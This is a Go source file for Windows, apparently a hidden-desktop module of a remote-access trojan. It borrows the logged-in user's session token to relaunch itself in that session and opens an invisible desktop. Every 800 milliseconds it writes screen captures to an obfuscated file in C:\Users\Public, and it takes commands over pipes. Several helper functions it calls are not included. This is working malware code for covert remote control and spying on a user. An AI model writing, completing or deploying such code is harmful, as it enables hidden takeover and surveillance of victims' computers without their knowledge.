//go:build windows

package main

import (
	"encoding/binary"
	"fmt"
	"os"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

var hdIsHost bool

var (
	procWTSQueryUserToken            = syscall.NewLazyDLL("wtsapi32.dll").NewProc("WTSQueryUserToken")
	procDuplicateTokenEx             = syscall.NewLazyDLL("advapi32.dll").NewProc("DuplicateTokenEx")
	procCreateProcessAsUserA         = syscall.NewLazyDLL("advapi32.dll").NewProc("CreateProcessAsUserA")
	procProcessIdToSessionId         = hdKernel32.NewProc("ProcessIdToSessionId")
	procWTSGetActiveConsoleSessionId = hdKernel32.NewProc("WTSGetActiveConsoleSessionId")
	procGetStdHandle                 = hdKernel32.NewProc("GetStdHandle")
	procPeekNamedPipe                = hdKernel32.NewProc("PeekNamedPipe")
	procReadFile                     = hdKernel32.NewProc("ReadFile")
	procWriteFile                    = hdKernel32.NewProc("WriteFile")
)

func hdFilePath() string {
	var serial uint32
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	getVol := kernel32.NewProc("GetVolumeInformationA")
	root := append([]byte("C:\\"), 0)
	getVol.Call(uintptr(unsafe.Pointer(&root[0])), 0, 0, uintptr(unsafe.Pointer(&serial)), 0, 0, 0, 0)
	return fmt.Sprintf(`C:\Users\Public\%08x.g2`, serial^0xA73C915E)
}

func readHDFile() string {
	b, err := os.ReadFile(hdFilePath())
	if err != nil || len(b) < 12 || !strings.HasPrefix(string(b), "HDIMG:") {
		return ""
	}
	return string(b)
}

func windowsSession() int {
	var sid uint32
	procProcessIdToSessionId.Call(uintptr(syscall.Getpid()), uintptr(unsafe.Pointer(&sid)))
	return int(sid)
}

func hdTakeHost() bool {
	h, _, _ := procGetStdHandle.Call(^uintptr(0) - 9) // STD_INPUT_HANDLE = -10
	if h == 0 || h == uintptr(^uint(0)) {
		return false
	}
	var mag [4]byte
	var got uint32
	r, _, _ := procPeekNamedPipe.Call(h, uintptr(unsafe.Pointer(&mag[0])), 4, uintptr(unsafe.Pointer(&got)), 0, 0)
	if r == 0 || got < 4 || mag != [4]byte{0xA7, 0x3C, 0x91, 0x5E} {
		return false
	}
	var n uint32
	procReadFile.Call(h, uintptr(unsafe.Pointer(&mag[0])), 4, uintptr(unsafe.Pointer(&n)), 0)
	hdIsHost = true
	return true
}

func hdOwnerLoop() {
	runtime.LockOSThread()
	if err := hdEnsure(); err != nil {
		return
	}
	procSetThreadDesktop.Call(uintptr(hdDesktop))
	hdSpawn(`C:\Windows\System32\notepad.exe`)
	hdMakeWindow()
	hdStarted = true
	for {
		img := hdCapture()
		if strings.HasPrefix(img, "HDIMG:") {
			os.WriteFile(hdFilePath(), []byte(img), 0644)
		}
		time.Sleep(800 * time.Millisecond)
	}
}

func hdHostMain() int {
	hdIsHost = true
	go hdOwnerLoop()
	in, _, _ := procGetStdHandle.Call(^uintptr(0) - 9)
	out, _, _ := procGetStdHandle.Call(^uintptr(0) - 11)
	for {
		var n uint32
		var got uint32
		r, _, _ := procReadFile.Call(in, uintptr(unsafe.Pointer(&n)), 4, uintptr(unsafe.Pointer(&got)), 0)
		if r == 0 || n == 0 || n > 4096 {
			return 0
		}
		buf := make([]byte, n)
		procReadFile.Call(in, uintptr(unsafe.Pointer(&buf[0])), uintptr(n), uintptr(unsafe.Pointer(&got)), 0)
		resp := handleHiddenDesktop(string(buf))
		nb := uint32(len(resp))
		body := []byte(resp)
		procWriteFile.Call(out, uintptr(unsafe.Pointer(&nb)), 4, uintptr(unsafe.Pointer(&got)), 0)
		if nb > 0 {
			procWriteFile.Call(out, uintptr(unsafe.Pointer(&body[0])), uintptr(nb), uintptr(unsafe.Pointer(&got)), 0)
		}
	}
}

func hdViaHost(cmd string) string {
	if hdToChild == 0 {
		if err := launchHDHost(); err != nil {
			return "desktop host failed " + err.Error()
		}
	}
	payload := []byte(cmd)
	var n uint32 = uint32(len(payload))
	var got uint32
	procWriteFile.Call(hdToChild, uintptr(unsafe.Pointer(&n)), 4, uintptr(unsafe.Pointer(&got)), 0)
	if len(payload) > 0 {
		procWriteFile.Call(hdToChild, uintptr(unsafe.Pointer(&payload[0])), uintptr(len(payload)), uintptr(unsafe.Pointer(&got)), 0)
	}
	done := make(chan string, 1)
	go func() {
		var got2 uint32
		r, _, _ := procReadFile.Call(hdFromChild, uintptr(unsafe.Pointer(&n)), 4, uintptr(unsafe.Pointer(&got2)), 0)
		if r == 0 || n == 0 || n > 2*1024*1024 {
			done <- "desktop host io failed"
			return
		}
		buf := make([]byte, n)
		procReadFile.Call(hdFromChild, uintptr(unsafe.Pointer(&buf[0])), uintptr(n), uintptr(unsafe.Pointer(&got2)), 0)
		done <- string(buf)
	}()
	select {
	case out := <-done:
		return out
	case <-time.After(12 * time.Second):
		return "desktop host io failed"
	}
}

var hdToChild, hdFromChild uintptr

func launchHDHost() error {
	sid, _, _ := procWTSGetActiveConsoleSessionId.Call()
	var tok, dup syscall.Handle
	r, _, e := procWTSQueryUserToken.Call(sid, uintptr(unsafe.Pointer(&tok)))
	if r == 0 {
		return e
	}
	defer syscall.CloseHandle(tok)
	r, _, e = procDuplicateTokenEx.Call(uintptr(tok), 0x02000000, 0, 2, 1, uintptr(unsafe.Pointer(&dup)))
	if r == 0 {
		return e
	}
	defer syscall.CloseHandle(dup)
	exe, err := os.Executable()
	if err != nil {
		return err
	}
	rPipe, wPipe, err := os.Pipe()
	if err != nil {
		return err
	}
	rr, ww, err := os.Pipe()
	if err != nil {
		return err
	}
	magic := []byte{0xA7, 0x3C, 0x91, 0x5E}
	wPipe.Write(magic)
	syscall.SetHandleInformation(syscall.Handle(wPipe.Fd()), 1, 0)
	syscall.SetHandleInformation(syscall.Handle(rr.Fd()), 1, 0)
	cmd := append([]byte(`"`+exe+`"`), 0)
	type startupInfoA struct {
		cb              uint32
		reserved        *byte
		desktop         *byte
		title           *byte
		x, y            uint32
		xSize, ySize    uint32
		xChars, yChars  uint32
		fill, flags     uint32
		show, reserved2 uint16
		reserved3       uintptr
		stdIn           syscall.Handle
		stdOut          syscall.Handle
		stdErr          syscall.Handle
	}
	desk := append([]byte("winsta0\\default"), 0)
	si := startupInfoA{
		cb:      uint32(unsafe.Sizeof(startupInfoA{})),
		desktop: &desk[0],
		flags:   0x100,
		stdIn:   syscall.Handle(rPipe.Fd()),
		stdOut:  syscall.Handle(ww.Fd()),
		stdErr:  syscall.Handle(ww.Fd()),
	}
	var pi struct {
		process, thread syscall.Handle
		pid, tid        uint32
	}
	r, _, e = procCreateProcessAsUserA.Call(
		uintptr(dup), 0, uintptr(unsafe.Pointer(&cmd[0])),
		0, 0, 1, 0, 0, 0,
		uintptr(unsafe.Pointer(&si)), uintptr(unsafe.Pointer(&pi)),
	)
	if r == 0 {
		return e
	}
	syscall.CloseHandle(pi.process)
	syscall.CloseHandle(pi.thread)
	hdToChild = uintptr(syscall.Handle(wPipe.Fd()))
	hdFromChild = uintptr(syscall.Handle(rr.Fd()))
	_ = binary.Size(nDummy{})
	return nil
}

type nDummy struct{ n uint32 }
